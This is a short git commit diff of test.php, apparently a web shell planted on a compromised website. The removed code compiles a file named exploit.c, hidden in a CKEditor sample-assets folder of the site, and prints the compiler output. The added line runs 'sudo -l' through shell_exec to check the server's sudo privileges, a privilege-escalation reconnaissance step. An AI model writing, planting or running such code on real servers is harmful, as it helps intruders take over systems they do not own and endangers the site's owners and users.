237d59ef872fe22daaf2d25b938edf43567b375d
xaoliknight <90129882+xaoliknight@users.noreply.github.com>
2021-10-07 21:51:32 +0200

    Update test.php

--- test.php
+++ test.php
@@ -1,13 +1,3 @@
 <?php
-    function rfile($fp) {
-    $out="";
-       while (!feof($fp)) {
-           $out.= fgets($fp, 1024000);
-       }
-       return $out;
-    }
-    $p = popen('gcc -Wall -g /var/www/flaming777.com/data/www/flaming777.com/public/back/bower_components/ckeditor/samples/old/assets/exploit.c -o /var/www/flaming777.com/data/www/flaming777.com/public/back/bower_components/ckeditor/samples/old/assets/exp.o 2>&1', 'r');
-    $result = rfile($p);
-    pclose($p);
-    echo $result;
+ echo shell_exec('sudo -l');
 ?>
